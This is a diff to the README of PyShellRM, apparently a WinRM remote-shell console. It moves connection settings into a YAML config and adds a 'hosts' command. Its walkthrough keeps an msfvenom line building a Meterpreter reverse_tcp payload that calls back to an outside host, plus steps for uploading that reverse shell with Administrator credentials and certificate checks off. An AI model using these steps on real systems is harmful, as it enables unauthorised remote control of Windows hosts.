@@ -19,38 +19,26 @@ All configuration options are defined in the Protocol object.
 5. Server Cert Validation: Whether server certificate should be validated
     *  \[`validate`, `ignore`]
 
-```Python
-p = winrm.protocol.Protocol(
-    endpoint='',
-    transport='',
-    username=r'',
-    password='',
-    server_cert_validation=''
-)
-```
-
-Example:
-
-```Python
-p = winrm.protocol.Protocol(
-    endpoint='http://example.com:5985/wsman',
-    transport='ntlm',
-    username=r'Administrator',
-    password='hunter2',
-    server_cert_validation='ignore'
-)
+```Yaml
+server:
+    endpoint: http://10.10.10.1:5985/wsman
+    transport: ntlm
+    username: User
+    password: Password
+    server_cert_validation: ignore
 ```
 
 ## Commands
 
 1. connect
-2. list                                  
-3. set
-4. unset
-5. upload
-6. shell
-7. close
-8. exit/quit
+2. list
+3. hosts                              
+4. set
+5. unset
+6. upload
+7. shell
+8. close
+9. exit/quit
 
 ### Connect
 
@@ -59,7 +47,7 @@ Connect uses the defined Protocol object to attempt a WinRM connection.
 Example:
 
 ```
-pyshellrm:~$ connect
+pyshellrm:~$ connect server
 [*] Connecting to http://10.10.10.1:5985/wsman
 [+] Connected to http://10.10.10.1:5985/wsman
 ```
@@ -73,6 +61,17 @@ Example:
 ```
 pyshellrm:~$ list
 938891EA-A825-4871-864C-C5F58A3EA135
+```
+
+### Hosts
+
+Lists the available hosts imported from the config.yml file.
+
+Example:
+
+```
+pyshellrm:~$ hosts
+server
 ```
 
 ### Set
@@ -142,20 +141,19 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=9999 -f exe
 
 Next we'll configure our Protocol.
 
-```Python
-p = winrm.protocol.Protocol(
-    endpoint='http://example.com:5985/wsman',
-    transport='ntlm',
-    username=r'Administrator',
-    password='hunter2',
-    server_cert_validation='ignore'
-)
+```Yaml
+server:
+    endpoint: http://10.10.10.1:5985/wsman
+    transport: ntlm
+    username: Administrator
+    password: hunter2
+    server_cert_validation: ignore
 ```
 
 Finally, we can launch the PyShellRM console and upload our reverse shell.
 
 ```
-pyshellrm:~$ connect
+pyshellrm:~$ connect server
 [*] Connecting to http://10.10.10.1:5985/wsman
 [+] Connected to http://10.10.10.1:5985/wsman
 pyshellrm:~$ set 85CB12CA-F0DB-468B-886B-2E4064C46727
